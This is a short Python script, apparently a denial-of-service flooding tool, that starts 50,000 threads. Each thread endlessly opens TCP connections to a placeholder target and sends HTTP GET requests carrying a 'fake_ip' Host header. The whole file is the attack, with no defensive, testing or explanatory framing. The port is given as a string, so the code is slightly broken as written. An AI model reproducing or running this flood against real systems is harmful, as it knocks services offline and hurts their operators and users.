import threading
import socket

target = "target-ip"
port = "port"
fake_ip = "fake-ip"

request_execute = 0


def request():
    while True:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        s.connect((target, port))
        s.sendto(("GET /" + target + " HTTP/1.1\r\n").encode('ascii'), (target, port))
        s.sendto(("Host: " + fake_ip + "\r\n\r\n").encode('ascii'), (target, port))
        s.close()

        global request_execute
        request_execute += 1
        print(request_execute)


for i in range(50000):
    thread = threading.Thread(target=request)
    thread.start()
